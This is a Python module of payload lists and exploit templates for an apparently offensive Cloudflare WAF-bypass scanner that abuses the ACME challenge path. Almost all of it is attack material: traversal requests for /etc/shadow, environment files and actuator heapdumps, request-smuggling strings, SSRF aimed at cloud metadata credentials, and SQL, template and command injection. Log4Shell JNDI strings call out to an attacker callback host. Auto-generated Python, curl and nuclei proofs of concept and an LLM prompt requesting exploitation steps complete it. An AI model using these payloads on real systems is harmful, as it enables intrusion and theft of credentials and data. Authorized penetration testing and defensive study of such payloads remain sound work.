#!/usr/bin/env python3
"""
Payloads and templates for Cloudflare ACME WAF Bypass Scanner
References:
- PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
- SecLists (https://github.com/danielmiessler/SecLists)
- HackTricks (https://book.hacktricks.wiki)
- FearsOff Research (https://fearsoff.org/research/cloudflare-acme)
"""

# ============================================
# CLOUDFLARE VULNERABILITY PAYLOADS
# ============================================

# Payloads for testing - Basic WAF Bypass check
ACME_PAYLOADS = [
    "/.well-known/acme-challenge/",
    "/.well-known/acme-challenge/test",
    "/.well-known/acme-challenge/ae",  # FearsOff technique - append harmless suffix
]

# 1. Spring Boot Actuator payloads - using ..;/ traversal (servlet stack quirk)
ACTUATOR_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/health",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/info",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/heapdump",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/threaddump",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/mappings",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/configprops",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/beans",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/metrics",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/loggers",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/scheduledtasks",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/conditions",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/jolokia",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/prometheus",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/gateway/routes",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/refresh",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/caches",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/shutdown",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/flyway",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/liquibase",
    # Depth variations
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/..;/actuator/env",
]

# 2. PHP LFI payloads - comprehensive from SecLists
PHP_LFI_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/../../../../etc/hosts",
    "/.well-known/acme-challenge/{token}/..%2f..%2f..%2f..%2fetc/passwd",
    "/.well-known/acme-challenge/{token}/..%2f..%2f..%2f..%2fetc/hosts",
    "/.well-known/acme-challenge/{token}/../../../../../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/../../../../../../../windows/win.ini",
    "/.well-known/acme-challenge/{token}/../../../../../../../windows/system.ini",
    "/.well-known/acme-challenge/{token}/....//....//....//....//etc/passwd",
    "/.well-known/acme-challenge/{token}/..%252f..%252f..%252f..%252fetc/passwd",
    # Null byte injection
    "/.well-known/acme-challenge/{token}/../../../../etc/passwd%00",
    "/.well-known/acme-challenge/{token}/../../../../etc/passwd%00.html",
    "/.well-known/acme-challenge/{token}/../../../../etc/passwd%00.jpg",
    # Additional targets
    "/.well-known/acme-challenge/{token}/../../../../etc/shadow",
    "/.well-known/acme-challenge/{token}/../../../../etc/group",
    "/.well-known/acme-challenge/{token}/../../../../etc/hostname",
    "/.well-known/acme-challenge/{token}/../../../../proc/self/environ",
    "/.well-known/acme-challenge/{token}/../../../../proc/self/cmdline",
    "/.well-known/acme-challenge/{token}/../../../../proc/version",
    "/.well-known/acme-challenge/{token}/../../../../var/log/apache2/access.log",
    "/.well-known/acme-challenge/{token}/../../../../var/log/nginx/access.log",
]

# 3. Next.js / SSR frameworks - check for server-side data exposure  
NEXTJS_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/main.js",
    "/.well-known/acme-challenge/{token}/../_next/data/",
    "/.well-known/acme-challenge/{token}/../api/",
    "/.well-known/acme-challenge/{token}/..;/api/health",
    "/.well-known/acme-challenge/{token}/..;/api/config",
    "/.well-known/acme-challenge/{token}/../_next/image",
    "/.well-known/acme-challenge/{token}/../__nextjs_original-stack-frame",
    "/.well-known/acme-challenge/{token}/../_next/static/development/_buildManifest.js",
    "/.well-known/acme-challenge/{token}/../_next/static/development/_ssgManifest.js",
]

# 4. General path traversal payloads - from PayloadsAllTheThings
PATH_TRAVERSAL_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/..%2f..%2f..%2fetc/passwd",
    "/.well-known/acme-challenge/{token}/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/.well-known/acme-challenge/{token}/....//....//....//etc/passwd",
    "/.well-known/acme-challenge/{token}/.%2e/.%2e/.%2e/etc/passwd",
    "/.well-known/acme-challenge/{token}/%252e%252e/%252e%252e/etc/passwd",
    # Unicode encoding bypass
    "/.well-known/acme-challenge/{token}/..%c0%af../..%c0%af../etc/passwd",
    "/.well-known/acme-challenge/{token}/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    # Backslash variations
    "/.well-known/acme-challenge/{token}/..\\..\\..\\etc/passwd",
    "/.well-known/acme-challenge/{token}/..%5c..%5c..%5cetc/passwd",
]

# 5. Cloudflare WAF Bypass - URL encoding variations
CF_WAF_BYPASS_PAYLOADS = [
    # Double URL encoding
    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    # Unicode normalization bypass
    "/..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    # Overlong UTF-8
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    # Null byte injection
    "/admin%00.js",
    "/admin%2500.js",
    "/admin%00.txt",
    # Case manipulation
    "/ADMIN",
    "/Admin",
    "/aDmIn",
    "/AdMiN",
    # Path parameter pollution
    "/admin;.js",
    "/admin%3b.css",
    "/admin;/",
    # Fragment bypass
    "/admin#.js",
    "/admin%23.css",
    # Dot variations
    "/./admin",
    "/admin/.",
    "/admin/./",
    "//admin",
    "///admin",
]

# 6. Cloudflare cache poisoning payloads
CF_CACHE_POISON_PAYLOADS = [
    # X-Forwarded headers
    "/?cb={random}",
    "/static/app.js?cb={random}",
    # Cache key manipulation
    "/index.html/nonexistent.css",
    "/api/users/..%2f..%2fstatic/app.js",
    # Web cache deception
    "/account/settings.css",
    "/account/profile.js",
    "/api/user.css",
    "/admin/.css",
]

# 7. Cloudflare specific bypass paths
CF_BYPASS_PATHS = [
    "/.well-known/",
    "/.well-known/security.txt",
    "/.well-known/change-password",
    "/.well-known/pki-validation/",
    "/.well-known/apple-app-site-association",
    "/.well-known/assetlinks.json",
    "/.well-known/openid-configuration",
    "/.well-known/webfinger",
    "/.well-known/matrix/client",
    "/cdn-cgi/",
    "/cdn-cgi/trace",
    "/cdn-cgi/l/email-protection",
    "/cdn-cgi/scripts/",
    "/cdn-cgi/pe/bag2",
    "/cdn-cgi/challenge-platform/",
    "/cdn-cgi/bm/cv/result",
]

# 8. HTTP Request Smuggling payloads (CF specific)
CF_SMUGGLING_PAYLOADS = [
    # CL.TE smuggling
    {"type": "CL.TE", "payload": "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"},
    # TE.CL smuggling  
    {"type": "TE.CL", "payload": "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"},
    # TE.TE obfuscation
    {"type": "TE.TE", "payload": "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n"},
]

# 9. Cloudflare Workers bypass attempts
CF_WORKERS_BYPASS = [
    "/__cf_workers",
    "/cdn-cgi/workers",
    "/_cf/",
    "/__cf__/",
    "/cdn-cgi/l/chk_jschl",
    "/cdn-cgi/challenge-platform/scripts/",
]

# 10. Host header injection payloads
HOST_HEADER_PAYLOADS = [
    {"Host": "evil.com"},
    {"Host": "127.0.0.1"},
    {"Host": "localhost"},
    {"Host": "169.254.169.254"},  # AWS metadata
    {"X-Forwarded-Host": "evil.com"},
    {"X-Host": "evil.com"},
    {"X-Forwarded-Server": "evil.com"},
    {"X-HTTP-Host-Override": "evil.com"},
    {"Forwarded": "host=evil.com"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
]

# 11. HTTP/2 specific bypasses
HTTP2_BYPASS_PAYLOADS = [
    # Pseudo-header manipulation
    {":authority": "evil.com", ":path": "/admin"},
    {":path": "/admin", ":authority": "{host}"},
    # CRLF in HTTP/2
    {":path": "/\r\nX-Injected: header"},
]

# 12. Rate limit bypass headers - comprehensive
RATE_LIMIT_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "{random_ip}"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"Forwarded-For": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-Forwarded-For": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

# 13. Admin panel / sensitive paths - extended
SENSITIVE_PATHS = [
    "/admin",
    "/administrator",
    "/wp-admin",
    "/phpmyadmin",
    "/cpanel",
    "/.git/config",
    "/.git/HEAD",
    "/.gitignore",
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    "/.htaccess",
    "/.htpasswd",
    "/config.php",
    "/config.yml",
    "/config.json",
    "/web.config",
    "/server-status",
    "/server-info",
    "/debug",
    "/debug/pprof",
    "/trace",
    "/console",
    "/graphql",
    "/graphiql",
    "/api/v1/",
    "/api/v2/",
    "/swagger.json",
    "/swagger-ui.html",
    "/api-docs",
    "/openapi.json",
    "/actuator",
    "/.svn/entries",
    "/.svn/wc.db",
    "/.DS_Store",
    "/backup.sql",
    "/dump.sql",
    "/database.sql",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/wp-config.php",
    "/wp-config.php.bak",
    "/robots.txt",
    "/sitemap.xml",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/.well-known/security.txt",
    "/package.json",
    "/composer.json",
    "/Gemfile",
    "/Dockerfile",
    "/docker-compose.yml",
    "/.dockerignore",
    "/Makefile",
    "/id_rsa",
    "/id_dsa",
    "/.ssh/authorized_keys",
    "/.bash_history",
    "/.zsh_history",
]

# 14. GraphQL introspection (often bypassed through ACME path)
GRAPHQL_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/..;/graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../api/graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}}}",
    "/.well-known/acme-challenge/{token}/../graphql?query=query{__schema{types{name,fields{name}}}}",
]

# 15. SSRF Payloads - from PayloadsAllTheThings
SSRF_PAYLOADS = [
    # Localhost bypasses
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://[0000::1]",
    "http://[::ffff:127.0.0.1]",
    "http://127.1",
    "http://127.0.1",
    "http://0",
    # Decimal IP
    "http://2130706433",  # 127.0.0.1
    "http://3232235521",  # 192.168.0.1
    "http://2852039166",  # 169.254.169.254 (AWS metadata)
    # Hex IP
    "http://0x7f000001",  # 127.0.0.1
    "http://0xc0a80001",  # 192.168.0.1
    "http://0xa9fea9fe",  # 169.254.169.254
    # Octal IP
    "http://0177.0.0.1",  # 127.0.0.1
    # Cloud Metadata endpoints
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://169.254.169.254/latest/user-data/",  # AWS
    "http://169.254.169.254/latest/api/token",  # AWS IMDSv2
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance",  # Azure
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://169.254.170.2/v1/credentials",  # AWS ECS
    # DNS rebinding
    "http://localtest.me",  # resolves to ::1
    "http://spoofed.burpcollaborator.net",
    "http://127.0.0.1.nip.io",
]

# 16. XSS Payloads - from PayloadsAllTheThings
XSS_PAYLOADS = [
    # Basic payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    # Encoded payloads
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    # Event handlers
    "<input autofocus onfocus=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<details/open/ontoggle=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    # WAF bypass
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>eval('\\x61lert(1)')</script>",
    "<img src=x onerror='&#97;lert(1)'>",
    # SVG XSS
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
    # Data URI
    "data:text/html,<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
]

# 17. SQL Injection Payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT 1,2,3--",
    "'; DROP TABLE users--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "admin'--",
    "admin' #",
    "-1 OR 2+2=4--",
    "1 OR 1=1",
    "' UNION SELECT username, password FROM users--",
]

# 18. XXE Payloads - XML External Entity
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{callback}">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>',
]

# 19. SSTI Payloads - Server-Side Template Injection
SSTI_PAYLOADS = [
    # Jinja2/Python
    "{{7*7}}",
    "{{config}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${7*7}",
    # Twig
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # Freemarker
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    # Velocity
    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))",
    # ERB
    "<%=7*7%>",
    "<%= system('id') %>",
    # Smarty
    "{php}echo `id`;{/php}",
]

# 20. Command Injection Payloads
CMD_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "; uname -a",
    "| uname -a",
    # Windows
    "& dir",
    "| dir",
    "& type C:\\windows\\win.ini",
    # Blind
    "; sleep 5",
    "| sleep 5",
    "; ping -c 5 {callback}",
    "| ping -c 5 {callback}",
    "`nslookup {callback}`",
    "$(nslookup {callback})",
]

# 21. Log4Shell/JNDI Payloads
LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://{callback}/a}",
    "${jndi:rmi://{callback}/a}",
    "${jndi:dns://{callback}/a}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://{callback}/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{callback}/a}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{callback}/a}",
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{callback}}",
]

# Headers for WAF bypass test - based on FearsOff research
# Account-level WAF rules are also bypassed on ACME path
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Host": "localhost"},
    {"X-HTTP-Method-Override": "PUT"},  # Method override trick
    {"X-middleware-subrequest": "1"},   # FearsOff specific test
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Port": "443"},
]


# ============================================
# POC TEMPLATES FOR EXPLOIT GENERATION
# ============================================

POC_TEMPLATES = {
    'python': '''#!/usr/bin/env python3
"""
Cloudflare WAF Bypass - Auto-Generated POC
Target: {target}
Generated: {timestamp}
Vulnerability: {vuln_type}

DISCLAIMER: For authorized testing only!
"""

import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{target}"
ORIGIN_IP = "{origin_ip}"  # Direct origin IP (if found)

def exploit():
    session = requests.Session()
    headers = {{
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        {custom_headers}
    }}
    
    # Exploit payloads
    payloads = {payloads}
    
    print(f"[*] Testing {{TARGET}}")
    
    for payload in payloads:
        url = f"{{TARGET}}{{payload}}"
        try:
            resp = session.get(url, headers=headers, timeout=10, verify=False)
            print(f"[{{resp.status_code}}] {{url[:80]}}")
            
            if resp.status_code == 200:
                print(f"    Content-Length: {{len(resp.content)}}")
                # Check for sensitive data
                if any(x in resp.text.lower() for x in ['password', 'secret', 'token', 'api_key']):
                    print(f"    [!] SENSITIVE DATA DETECTED!")
                    print(resp.text[:500])
        except Exception as e:
            print(f"[ERR] {{str(e)[:50]}}")
    
    # Direct origin access (if IP found)
    if ORIGIN_IP and ORIGIN_IP != "N/A":
        print(f"\\n[*] Testing direct origin: {{ORIGIN_IP}}")
        headers["Host"] = "{hostname}"
        try:
            url = f"https://{{ORIGIN_IP}}/"
            resp = session.get(url, headers=headers, timeout=10, verify=False)
            print(f"[{{resp.status_code}}] Direct origin access - {{len(resp.content)}} bytes")
        except Exception as e:
            print(f"[ERR] {{str(e)[:50]}}")

if __name__ == "__main__":
    exploit()
''',

    'curl': '''#!/bin/bash
# Cloudflare WAF Bypass - Auto-Generated POC
# Target: {target}
# Generated: {timestamp}
# Vulnerability: {vuln_type}
# DISCLAIMER: For authorized testing only!

TARGET="{target}"
ORIGIN_IP="{origin_ip}"

echo "[*] Testing WAF Bypass on $TARGET"

# WAF Bypass payloads
{curl_commands}

# Direct origin access (if IP found)
if [ "$ORIGIN_IP" != "N/A" ]; then
    echo ""
    echo "[*] Testing direct origin: $ORIGIN_IP"
    curl -k -s -o /dev/null -w "%{{http_code}}" -H "Host: {hostname}" "https://$ORIGIN_IP/"
    echo " - Direct origin access"
fi
''',

    'nuclei': '''id: cloudflare-waf-bypass-{target_safe}

info:
  name: Cloudflare WAF Bypass - {target}
  author: auto-generated
  severity: high
  description: |
    Cloudflare WAF bypass detected on {target}
    Vulnerability: {vuln_type}
  tags: cloudflare,waf,bypass
  reference:
    - https://fearsoff.org/research/cloudflare-acme

http:
{nuclei_requests}

# Generated: {timestamp}
''',

    'burp': '''# Burp Suite Request - Cloudflare WAF Bypass
# Target: {target}
# Generated: {timestamp}

{burp_requests}
''',
}


# ============================================
# LLM ANALYSIS PROMPT TEMPLATES  
# ============================================

LLM_ANALYSIS_PROMPT = '''You are an expert security researcher analyzing vulnerability scan results.

## Scan Results
Target: {target}
Cloudflare Protected: {cloudflare}
WAF Bypass Detected: {waf_bypass}
Framework Detected: {framework}
Origin IP(s): {origin_ips}

## Findings:
{findings_json}

## Analysis Tasks:
1. **Risk Assessment**: Rate the overall risk (Critical/High/Medium/Low) and explain why
2. **Attack Chain**: Describe potential attack chains combining these vulnerabilities
3. **Impact Analysis**: What sensitive data or systems could be compromised?
4. **Exploitation Steps**: Step-by-step exploitation guide for penetration testers
5. **Remediation**: Specific recommendations to fix each vulnerability
6. **CVSS Score**: Estimate CVSS 3.1 score with vector string

Provide detailed, actionable analysis for security professionals.
'''
